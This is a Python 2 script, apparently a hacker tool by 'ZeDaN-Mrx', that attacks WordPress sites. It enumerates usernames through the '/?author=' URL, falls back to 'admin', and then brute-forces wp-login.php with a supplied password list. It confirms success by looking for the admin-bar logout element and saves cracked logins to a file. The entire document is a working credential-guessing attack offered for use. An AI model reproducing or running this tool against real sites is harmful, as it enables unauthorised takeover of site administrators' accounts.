import sys , re , urllib2 , urllib , cookielib , os, socket
try :
    import requests
except ImportError :
    print "pip install requests"
    sys.exit()
'''
Only For Wordpress Sites ! 
By : ZeDaN-Mrx
Usage : script.py http://localhost passlist.txt
You Can Put +10k Pass List :D
Email : Zedan-Mrx@bk.ru
./FuHrer
'''
users = []
Fuhrer = requests.session()
site = sys.argv[1]
try:
	print "[+] Url is " + site
except Exception, Mrx:
	print "Check Site Please !\n" + str(Mrx)
	sys.exit()
class Zedan:
	def xa(slef):
		print "[+] Scanning"
		for i in range(5):
			send = site+'/?author='+str(i)
			try:
				o = Fuhrer.get(send)
				if o.status_code == 200:
					data = o.content
					title = re.findall("<title>(.*?)</title>" , data)
					user = re.search("(.*?) |" , title[0]).group(1)
					print "[+] User Detected : "+user
					users.append(user)
				else:
					pass
			except:
				pass

			if len(users) == 0:
				oo = users.append("admin")
				print "[~] I Will Use 'Admin' to Brute "
			else:
				pass                
	def brute(self):
		try:
			xads = sys.argv[2]
			with open(xads) as zCheck:
				if sum(1 for _ in zCheck) == 0:
					print "The File "+xads+" is Empty !"
					exit(-1)
				else:
					passlist = open(xads,"r")
					for password in passlist:
						password = password.rstrip()
						for user in users:
							print "[+] Trying With : " + user +"|"+ password
							Cookies = cookielib.CookieJar()
							openitplz = urllib2.build_opener(urllib2.HTTPCookieProcessor(Cookies))
							dataforlogin = urllib.urlencode({'log' : user, 'pwd' : password})
							try:
								f = Fuhrer.get(site+"/wp-login.php")
								if f.status_code == 200:
									try:
										openitplz.open(str(site) + '/wp-login.php', dataforlogin)
										resp = openitplz.open(str(site)+'/wp-admin')
										final = resp.read()
										if '<li id="wp-admin-bar-logout">' in final:
											print "[+] => Cracked | Done !"
											open("Info.txt","a").writelines(site+"/wp-login.php#"+user+"@"+password+"\n")
											break
										else:
											print "[-] => Wrong LoginData !"
									except Exception, Mrx:
										print "[!]" + str(Mrx)
										sys.exit()
							except Exception,Mrx:
								print "[!] wp-login 404\n"+str(Mrx)
								sys.exit()
		except Exception, Mrx:
			print "[!]Usage : script.py http://localhost passlist.txt\n" + str(Mrx)
			sys.exit()
fd = Zedan()
print """\n[+] Wordpress Sites BruteForce & Auto Username Detector By : ZeDaN-Mrx\n[+] Instagram : @xFuhr3r\n"""
try:
	fd.xa()
	fd.brute()
except:
	pass
